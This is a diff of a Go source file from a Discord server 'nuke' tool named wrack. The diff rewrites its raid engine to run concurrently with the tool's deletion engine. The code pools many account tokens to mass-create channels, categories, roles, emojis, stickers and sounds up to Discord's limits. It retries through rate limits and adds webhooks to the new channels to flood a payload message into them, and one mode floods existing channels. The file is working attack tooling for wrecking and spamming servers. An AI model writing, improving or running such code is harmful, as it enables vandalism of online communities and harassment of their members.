@@ -1,57 +1,67 @@
 // Package raid spams creation of channels/categories/roles/emojis/stickers/
-// sounds/webhooks until caps or Discord limits, then floods messages.
+// sounds concurrently with the nuke's deletions. Created objects are tracked
+// so wrack never deletes its own work.
 package raid
 
 import (
 	"context"
 	"encoding/base64"
 	"fmt"
+	"math/rand"
+	"strings"
 	"sync"
+	"sync/atomic"
+	"time"
 
 	"github.com/M1noa/wrack/api"
 	"github.com/M1noa/wrack/nuke"
 	"github.com/M1noa/wrack/payload"
 	"github.com/M1noa/wrack/token"
 	"github.com/M1noa/wrack/ui"
+	"github.com/M1noa/wrack/work"
 )
 
 // Config caps spam creation (0 = hit Discord limits).
 type Config struct {
-	GuildID     string
-	Short       string // spam name for everything
-	MaxChannels int
-	MaxRoles    int
-	MaxEmojis   int
-	MaxStickers int
-	MaxSounds   int
-	NSFW        bool // set nsfw=true on created channels
-	ImageData   []byte
+	GuildID       string
+	Short         string // base name for everything
+	MaxChannels   int
+	MaxCategories int
+	MaxRoles      int
+	MaxEmojis     int
+	MaxStickers   int
+	MaxSounds     int
+	NSFW          bool
+	ImageData     []byte
+	NoWebhook     bool
+	ForceHook     bool
 }
 
 // Engine creates spam objects.
 type Engine struct {
 	Cfg  *Config
 	Pool *token.Pool
-	Nuke *nuke.Engine // for TrackCreated + shared state
+	Nuke *nuke.Engine
+	Disp *work.Dispatcher
 	msg  *payload.Message
-	mu   sync.Mutex
+
+	newChans chan api.Channel           // created channels stream to hook pumps
+	cats     []api.Channel              // categories we made (random parents)
+	hooks    map[string]*api.Webhook    // channel id -> webhook
+	seq      map[string]*atomic.Int64   // per-type name counters
+	attempts int                        // retries per slot before giving up
+
+	mu sync.Mutex
 }
 
 // New builds a Raid engine.
-func New(cfg *Config, pool *token.Pool, n *nuke.Engine, msg *payload.Message) *Engine {
-	return &Engine{Cfg: cfg, Pool: pool, Nuke: n, msg: msg}
-}
-
-// Run fires all creation phases in order.
-func (e *Engine) Run(ctx context.Context) {
-	e.channels(ctx)
-	e.categories(ctx)
-	e.roles(ctx)
-	e.emojis(ctx)
-	e.stickers(ctx)
-	e.sounds(ctx)
-	e.webhooks(ctx)
-	e.messages(ctx)
+func New(cfg *Config, pool *token.Pool, n *nuke.Engine, disp *work.Dispatcher, msg *payload.Message) *Engine {
+	return &Engine{
+		Cfg: cfg, Pool: pool, Nuke: n, Disp: disp, msg: msg,
+		hooks:    make(map[string]*api.Webhook),
+		seq:      map[string]*atomic.Int64{"emoji": {}, "sticker": {}, "sound": {}},
+		attempts: 40, // retries per slot; deletions free slots mid-run
+	}
 }
 
 func (e *Engine) tokens() []*token.Token {
@@ -64,154 +74,236 @@ func (e *Engine) tokens() []*token.Token {
 	return out
 }
 
-// createLoop fans out n creations round-robin across tokens with a cap.
-func createLoop[T any](ctx context.Context, tokens []*token.Token, maxN int, fn func(*token.Token, int) (*T, error)) []any {
-	if len(tokens) == 0 || maxN == 0 {
+func (e *Engine) nextTok() *token.Token { return e.Pool.Next() }
+
+// name returns short for the first item of a type, shortN after (unique names).
+func (e *Engine) name(kind string) string {
+	n := e.seq[kind].Add(1)
+	if n <= 1 {
+		return e.Cfg.Short
+	}
+	return fmt.Sprintf("%s%d", e.Cfg.Short, n)
+}
+
+// Run launches every creator loop concurrently with the nuke's deletions.
+// Returns a func that blocks until all creation + message pumping drains.
+func (e *Engine) Run(ctx context.Context) func() {
+	e.newChans = make(chan api.Channel, 2048)
+
+	pumps := 4
+	pumpDone := make(chan struct{})
+	var pumpWG sync.WaitGroup
+	pumpWG.Add(pumps)
+	for i := 0; i < pumps; i++ {
+		go func() {
+			defer pumpWG.Done()
+			e.hookPump(ctx)
+		}()
+	}
+	go func() { pumpWG.Wait(); close(pumpDone) }()
+
+	var wg sync.WaitGroup
+	wg.Add(6)
+	go func() { defer wg.Done(); e.categoriesLoop(ctx) }()
+	go func() { defer wg.Done(); e.channelsLoop(ctx) }()
+	go func() { defer wg.Done(); e.rolesLoop(ctx) }()
+	go func() { defer wg.Done(); e.emojisLoop(ctx) }()
+	go func() { defer wg.Done(); e.stickersLoop(ctx) }()
+	go func() { defer wg.Done(); e.soundsLoop(ctx) }()
+
+	return func() {
+		wg.Wait()
+		close(e.newChans)
+		<-pumpDone
+		ui.Ok("webhooks: %d | messages routed", len(e.hooks))
+	}
+}
+
+// retryLoop hammers fn until it succeeds or attempts run out. Do() already
+// hammer-retries 429s internally, so failures here are structural (cap full,
+// missing perms); we poll briefly in case deletions free slots mid-run.
+func (e *Engine) retryLoop(ctx context.Context, tries int, fn func() error) bool {
+	for i := 0; i < tries; i++ {
+		if ctx.Err() != nil {
+			return false
+		}
+		if err := fn(); err == nil {
+			return true
+		}
+		select {
+		case <-ctx.Done():
+			return false
+		case <-time.After(150 * time.Millisecond):
+		}
+	}
+	return false
+}
+
+func (e *Engine) randomParent() *string {
+	e.mu.Lock()
+	defer e.mu.Unlock()
+	if len(e.cats) == 0 {
 		return nil
 	}
-	if maxN < 0 {
-		maxN = 500 // Discord channel cap as sane default when unlimited
-	}
-	shards := token.Shard(make([]int, maxN), len(tokens))
-	out := make([]any, 0, maxN)
-	var mu sync.Mutex
-	var wg sync.WaitGroup
+	id := e.cats[rand.Intn(len(e.cats))].ID
+	return &id
+}
 
-	// Assign sequential IDs per shard so names differ slightly if desired;
-	// we just use the same short name repeatedly per user request.
-	for i, shard := range shards {
-		wg.Add(1)
-		go func(shard []int, idx int) {
-			defer wg.Done()
-			t := tokens[idx%len(tokens)]
-			for range shard {
+func (e *Engine) categoriesLoop(ctx context.Context) {
+	n := e.Cfg.MaxCategories
+	if n <= 0 {
+		n = e.Cfg.MaxChannels / 8
+		if n <= 0 {
+			n = 8
+		}
+		if n > 40 {
+			n = 40
+		}
+	}
+	target := n
+	if e.Cfg.MaxChannels > 0 && target > e.Cfg.MaxChannels {
+		target = e.Cfg.MaxChannels
+	}
+	p := &ui.Progress{Label: "mk-cat", Total: int64(target)}
+	for i := 0; i < target; i++ {
+		e.Disp.Submit("mkCat", func() {
+			ok := e.retryLoop(ctx, e.attempts, func() error {
+				t := e.nextTok()
+				if t == nil {
+					return fmt.Errorf("no token")
+				}
+				ch, err := t.Client.CreateChannel(ctx, e.Cfg.GuildID,
+					map[string]any{"name": e.Cfg.Short, "type": 4})
+				if err != nil {
+					return err
+				}
+				e.mu.Lock()
+				e.cats = append(e.cats, *ch)
+				e.mu.Unlock()
+				e.Nuke.TrackCreated(ch.ID)
+				return nil
+			})
+			if ok {
+				p.Tick(1)
+			}
+		})
+	}
+}
+
+func (e *Engine) channelsLoop(ctx context.Context) {
+	target := e.Cfg.MaxChannels
+	if target <= 0 {
+		target = 500 // Discord guild channel cap
+	}
+	p := &ui.Progress{Label: "mk-chan", Total: int64(target)}
+	for i := 0; i < target; i++ {
+		e.Disp.Submit("mkChan", func() {
+			ok := e.retryLoop(ctx, e.attempts, func() error {
+				t := e.nextTok()
+				if t == nil {
+					return fmt.Errorf("no token")
+				}
+				body := map[string]any{"name": e.Cfg.Short, "type": 0}
+				if parent := e.randomParent(); parent != nil {
+					body["parent_id"] = *parent
+				}
+				if e.Cfg.NSFW {
+					body["nsfw"] = true
+				}
+				ch, err := t.Client.CreateChannel(ctx, e.Cfg.GuildID, body)
+				if err != nil {
+					return err
+				}
+				e.Nuke.TrackCreated(ch.ID)
 				select {
-				case <-ctx.Done():
-					return
+				case e.newChans <- *ch:
 				default:
 				}
-				obj, err := fn(t, idx)
-				if err == nil && obj != nil {
-					mu.Lock()
-					out = append(out, obj)
-					mu.Unlock()
-				}
+				return nil
+			})
+			if ok {
+				p.Tick(1)
 			}
-		}(shard, i)
-	}
-	wg.Wait()
-	return out
-}
-
-func (e *Engine) channels(ctx context.Context) {
-	n := e.Cfg.MaxChannels
-	if n <= 0 {
-		n = -1 // unlimited
-	}
-	p := &ui.Progress{Label: "channels"}
-	body := map[string]any{
-		"name": e.Cfg.Short,
-		"type": 0,
-	}
-	if e.Cfg.NSFW {
-		body["nsfw"] = true
-	}
-	created := createLoop[api.Channel](ctx, e.tokens(), n, func(t *token.Token, _ int) (*api.Channel, error) {
-		ch, err := t.Client.CreateChannel(ctx, e.Cfg.GuildID, body)
-		if err != nil {
-			return nil, err
-		}
-		p.Tick(1)
-		return ch, nil
-	})
-	p.Finish()
-	ui.Ok("channels created: %d", len(created))
-}
-
-func (e *Engine) categories(ctx context.Context) {
-	n := 5 // small; categories aren't the point
-	p := &ui.Progress{Label: "categories", Total: int64(n)}
-	_ = createLoop[api.Channel](ctx, e.tokens(), n, func(t *token.Token, _ int) (*api.Channel, error) {
-		ch, err := t.Client.CreateChannel(ctx, e.Cfg.GuildID, map[string]any{"name": e.Cfg.Short, "type": 4})
-		if err != nil {
-			return nil, err
-		}
-		p.Tick(1)
-		return ch, nil
-	})
-	p.Finish()
-}
-
-func (e *Engine) roles(ctx context.Context) {
-	n := e.Cfg.MaxRoles
-	if n <= 0 {
-		n = 250 // Discord role cap
-	}
-	p := &ui.Progress{Label: "roles", Total: int64(n)}
-	created := createLoop[api.Role](ctx, e.tokens(), n, func(t *token.Token, i int) (*api.Role, error) {
-		r, err := t.Client.CreateRole(ctx, e.Cfg.GuildID, map[string]any{
-			"name":        e.Cfg.Short,
-			"color":       ui.AccentColor,
-			"mentionable": true,
 		})
-		if err != nil {
-			return nil, err
-		}
-		p.Tick(1)
-		return r, nil
-	})
-	p.Finish()
-	ui.Ok("roles created: %d", len(created))
+	}
 }
 
-func (e *Engine) emojis(ctx context.Context) {
-	n := e.Cfg.MaxEmojis
-	imgData := e.Cfg.ImageData
-	if imgData == nil {
+func (e *Engine) rolesLoop(ctx context.Context) {
+	target := e.Cfg.MaxRoles
+	if target <= 0 {
+		target = 250
+	}
+	p := &ui.Progress{Label: "mk-role", Total: int64(target)}
+	for i := 0; i < target; i++ {
+		e.Disp.Submit("mkRole", func() {
+			ok := e.retryLoop(ctx, e.attempts, func() error {
+				t := e.nextTok()
+				if t == nil {
+					return fmt.Errorf("no token")
+				}
+				r, err := t.Client.CreateRole(ctx, e.Cfg.GuildID, map[string]any{
+					"name":        e.Cfg.Short,
+					"color":       ui.AccentColor,
+					"mentionable": true,
+				})
+				if err != nil {
+					return err
+				}
+				e.Nuke.TrackCreated(r.ID)
+				return nil
+			})
+			if ok {
+				p.Tick(1)
+			}
+		})
+	}
+}
+
+func (e *Engine) emojisLoop(ctx context.Context) {
+	img := e.Cfg.ImageData
+	if img == nil {
 		b, err := payload.BlankPNG(320)
 		if err != nil {
-			ui.Err("blank emoji png: %v", err)
 			return
 		}
-		imgData = b
+		img = b
 	}
-	dataURI := payload.DataURI(imgData)
+	dataURI := payload.DataURI(img)
 
-	// Fetch existing to know how many slots are left.
-	t := e.Pool.Next()
-	if t == nil {
-		return
+	target := e.Cfg.MaxEmojis
+	if target <= 0 {
+		target = emojiCap(guildTier(e))
 	}
-	existing, _ := t.Client.ListEmojis(ctx, e.Cfg.GuildID)
-	capacity := emojiCap(e.Nuke.Snap.Guild.PremiumTier)
-	slots := capacity - len(existing)
-	if slots <= 0 {
-		ui.Dim("emoji slots full (%d/%d)", len(existing), capacity)
-		return
-	}
-	if n > slots {
-		n = slots
-	}
-	if n <= 0 {
-		return
-	}
-	p := &ui.Progress{Label: "emojis", Total: int64(n)}
-	created := createLoop[api.Emoji](ctx, e.tokens(), n, func(t *token.Token, i int) (*api.Emoji, error) {
-		em, err := t.Client.CreateEmoji(ctx, e.Cfg.GuildID, map[string]any{
-			"name": e.Cfg.Short, "image": dataURI,
+	p := &ui.Progress{Label: "mk-emoji", Total: int64(target)}
+	for i := 0; i < target; i++ {
+		e.Disp.Submit("mkEmoji", func() {
+			name := e.name("emoji")
+			ok := e.retryLoop(ctx, e.attempts, func() error {
+				t := e.nextTok()
+				if t == nil {
+					return fmt.Errorf("no token")
+				}
+				em, err := t.Client.CreateEmoji(ctx, e.Cfg.GuildID,
+					map[string]any{"name": name, "image": dataURI})
+				if err != nil {
+					return err
+				}
+				e.Nuke.TrackCreated(em.ID)
+				return nil
+			})
+			if ok {
+				p.Tick(1)
+			}
 		})
-		if err != nil {
-			return nil, err
-		}
-		p.Tick(1)
-		return em, nil
-	})
-	p.Finish()
-	ui.Ok("emojis created: %d", len(created))
+	}
 }
 
-// Guild premium tier is cached on client after recon via GetGuild; approximate here.
-var tierCache = make(map[string]int)
+func guildTier(e *Engine) int {
+	if e.Nuke.Snap != nil && e.Nuke.Snap.Guild != nil {
+		return e.Nuke.Snap.Guild.PremiumTier
+	}
+	return 0
+}
 
 func emojiCap(tier int) int {
 	switch tier {
@@ -226,138 +318,177 @@ func emojiCap(tier int) int {
 	}
 }
 
-func (e *Engine) stickers(ctx context.Context) {
-	n := e.Cfg.MaxStickers
-	imgData := e.Cfg.ImageData
-	if imgData == nil {
+func stickerCap(tier int) int {
+	switch tier {
+	case 3:
+		return 60
+	case 2:
+		return 30
+	case 1:
+		return 15
+	default:
+		return 5
+	}
+}
+
+func soundCap(tier int) int {
+	switch tier {
+	case 3:
+		return 96
+	case 2:
+		return 48
+	case 1:
+		return 24
+	default:
+		return 8
+	}
+}
+
+func (e *Engine) stickersLoop(ctx context.Context) {
+	img := e.Cfg.ImageData
+	fileType := "image/png"
+	fname := "wrack.png"
+	if img == nil {
 		b, err := payload.BlankPNG(320)
 		if err != nil {
-			ui.Err("blank sticker png: %v", err)
 			return
 		}
-		imgData = b
+		img = b
 	}
-	t := e.Pool.Next()
-	if t == nil {
-		return
+
+	target := e.Cfg.MaxStickers
+	if target <= 0 {
+		target = stickerCap(guildTier(e))
 	}
-	existing, _ := t.Client.ListStickers(ctx, e.Cfg.GuildID)
-	capacity := stickerCap(e.Cfg.GuildID)
-	slots := capacity - len(existing)
-	if slots <= 0 {
-		ui.Dim("sticker slots full (%d/%d)", len(existing), capacity)
-		return
+	p := &ui.Progress{Label: "mk-sticker", Total: int64(target)}
+	for i := 0; i < target; i++ {
+		e.Disp.Submit("mkSticker", func() {
+			name := e.name("sticker")
+			ok := e.retryLoop(ctx, e.attempts, func() error {
+				t := e.nextTok()
+				if t == nil {
+					return fmt.Errorf("no token")
+				}
+				s, err := t.Client.CreateSticker(ctx, e.Cfg.GuildID,
+					name, "", name, fname, fileType, img)
+				if err != nil {
+					return err
+				}
+				e.Nuke.TrackCreated(s.ID)
+				return nil
+			})
+			if ok {
+				p.Tick(1)
+			}
+		})
 	}
-	if n > slots || n <= 0 {
-		n = slots
-	}
-	p := &ui.Progress{Label: "stickers", Total: int64(n)}
-	created := createLoop[api.Sticker](ctx, e.tokens(), n, func(t *token.Token, i int) (*api.Sticker, error) {
-		// Sticker upload uses multipart/form-data; simplified here as JSON body
-		// since our api.Do marshals JSON. Real impl needs multipart support.
-		// TODO: multipart upload path in api package.
-		return nil, errNotImpl
-	})
-	_ = created
-	p.Finish()
-	ui.Warn("stickers: multipart upload not yet wired")
 }
 
-var errNotImpl = fmt.Errorf("not implemented")
-
-func stickerCap(guildID string) int { return 5 } // base tier; boost raises it
-
-func (e *Engine) sounds(ctx context.Context) {
-	n := e.Cfg.MaxSounds
+func (e *Engine) soundsLoop(ctx context.Context) {
 	soundBytes := payload.SilentMP3()
 	dataURI := "data:audio/mpeg;base64," + base64.StdEncoding.EncodeToString(soundBytes)
-	t := e.Pool.Next()
-	if t == nil {
-		return
-	}
-	existing, _ := t.Client.ListSounds(ctx, e.Cfg.GuildID)
-	slots := 8 - len(existing) // soundboard default cap ~8; boost tiers raise
-	if slots <= 0 {
-		ui.Dim("sound slots full")
-		return
-	}
-	if n > slots || n <= 0 {
-		n = slots
-	}
-	p := &ui.Progress{Label: "sounds", Total: int64(n)}
-	created := createLoop[api.SoundboardSound](ctx, e.tokens(), n, func(t *token.Token, i int) (*api.SoundboardSound, error) {
-		resp, err := t.Client.Do(ctx, "POST",
-			fmt.Sprintf("/guilds/%s/soundboard-sounds", e.Cfg.GuildID),
-			map[string]any{"name": e.Cfg.Short, "sound": dataURI})
-		if err != nil {
-			return nil, err
-		}
-		if resp.StatusCode >= 400 {
-			api.DiscardBody(resp)
-			return nil, fmt.Errorf("create sound: %d", resp.StatusCode)
-		}
-		var s api.SoundboardSound
-		if err := api.DecodeJSON(resp, &s); err != nil {
-			return nil, err
-		}
-		p.Tick(1)
-		return &s, nil
-	})
-	p.Finish()
-	ui.Ok("sounds created: %d", len(created))
-}
 
-func (e *Engine) webhooks(ctx context.Context) {
-	// For every channel we know about, try to add a webhook named short.
-	hookTokens := e.Pool.WithPerm(api.PermManageWebhooks)
-	if len(hookTokens) == 0 {
-		ui.Dim("no MANAGE_WEBHOOKS; skipping webhook creation")
-		return
+	target := e.Cfg.MaxSounds
+	if target <= 0 {
+		target = soundCap(guildTier(e))
 	}
-	chans := e.Nuke.Snap.TextVoice // post-nuke this is empty unless message-only mode
-	p := &ui.Progress{Label: "webhooks", Total: int64(len(chans))}
-	fanOut(hookTokens, chans, func(t *token.Token, ch api.Channel) {
-		if _, err := t.Client.CreateWebhook(ctx, ch.ID, e.Cfg.Short, "wrack"); err == nil {
-			p.Tick(1)
-		}
-	})
-	p.Finish()
-}
-
-func fanOut[T any](tokens []*token.Token, items []T, fn func(*token.Token, T)) {
-	if len(items) == 0 || len(tokens) == 0 {
-		return
-	}
-	shards := token.Shard(items, len(tokens))
-	var wg sync.WaitGroup
-	for i, sh := range shards {
-		wg.Add(1)
-		go func(shard []T, t *token.Token) {
-			defer wg.Done()
-			for _, item := range shard {
-				fn(t, item)
+	p := &ui.Progress{Label: "mk-sound", Total: int64(target)}
+	for i := 0; i < target; i++ {
+		e.Disp.Submit("mkSound", func() {
+			name := e.name("sound")
+			ok := e.retryLoop(ctx, e.attempts, func() error {
+				t := e.nextTok()
+				if t == nil {
+					return fmt.Errorf("no token")
+				}
+				resp, err := t.Client.Do(ctx, "POST",
+					fmt.Sprintf("/guilds/%s/soundboard-sounds", e.Cfg.GuildID),
+					map[string]any{"name": name, "sound": dataURI})
+				if err != nil {
+					return err
+				}
+				if resp.StatusCode >= 400 {
+					api.DiscardBody(resp)
+					return fmt.Errorf("create sound: %d", resp.StatusCode)
+				}
+				var s api.SoundboardSound
+				if err := api.DecodeJSON(resp, &s); err != nil {
+					return err
+				}
+				e.Nuke.TrackCreated(s.SoundID)
+				return nil
+			})
+			if ok {
+				p.Tick(1)
 			}
-		}(sh, tokens[i])
+		})
 	}
-	wg.Wait()
 }
 
-func (e *Engine) messages(ctx context.Context) {
-	if e.msg == nil {
-		ui.Dim("no message set; skipping flood")
+// hookPump consumes newly created channels: attaches a webhook and fires the
+// payload through it (or normal-sends when webhooks aren't available/allowed).
+func (e *Engine) hookPump(ctx context.Context) {
+	hookTokens := e.Pool.WithPerm(api.PermManageWebhooks)
+	useHooks := !e.Cfg.NoWebhook && len(hookTokens) > 0
+
+	for ch := range e.newChans {
+		sent := false
+		if useHooks {
+			t := hookTokens[rand.Intn(len(hookTokens))]
+			w, err := t.Client.CreateWebhook(ctx, ch.ID, e.Cfg.Short, "wrack")
+			if err == nil && w != nil && w.Token != nil && *w.Token != "" {
+				e.mu.Lock()
+				e.hooks[ch.ID] = w
+				e.mu.Unlock()
+				e.Nuke.TrackCreated(w.ID)
+				if e.msg != nil && t.Client.ExecuteWebhook(ctx, w.ID, *w.Token, e.msg) == nil {
+					sent = true
+				}
+			}
+		}
+		if !sent && e.msg != nil && !e.Cfg.ForceHook {
+			t := e.nextTok()
+			if t != nil {
+				_ = t.Client.SendMessage(ctx, ch.ID, e.msg)
+			}
+		}
+	}
+}
+
+// MessagesOnly floods existing channels without deleting anything.
+func (e *Engine) MessagesOnly(ctx context.Context) {
+	if e.Nuke.Snap == nil {
 		return
 	}
 	chans := e.Nuke.Snap.TextVoice
-	if len(chans) == 0 {
+	if len(chans) == 0 || e.msg == nil {
 		return
 	}
-	fanOut(e.tokens(), chans, func(t *token.Token, ch api.Channel) {
-		_ = t.Client.SendMessage(ctx, ch.ID, e.msg)
-	})
-	ui.Ok("messages flooded into %d channels", len(chans))
+	hookTokens := e.Pool.WithPerm(api.PermManageWebhooks)
+	useHooks := !e.Cfg.NoWebhook && len(hookTokens) > 0
+	p := &ui.Progress{Label: "msg", Total: int64(len(chans))}
+	for _, ch := range chans {
+		ch := ch
+		e.Disp.Submit("msg", func() {
+			sent := false
+			if useHooks {
+				t := hookTokens[rand.Intn(len(hookTokens))]
+				w, err := t.Client.CreateWebhook(ctx, ch.ID, e.Cfg.Short, "wrack")
+				if err == nil && w != nil && w.Token != nil && *w.Token != "" {
+					if t.Client.ExecuteWebhook(ctx, w.ID, *w.Token, e.msg) == nil {
+						sent = true
+					}
+				}
+			}
+			if !sent && !e.Cfg.ForceHook {
+				t := e.nextTok()
+				if t != nil {
+					_ = t.Client.SendMessage(ctx, ch.ID, e.msg)
+				}
+			}
+			p.Tick(1)
+		})
+	}
 }
 
-// MessagesOnly sends messages to every existing channel without deleting anything.
-func (e *Engine) MessagesOnly(ctx context.Context) { e.messages(ctx) }
-
-
+var _ = strings.TrimSpace
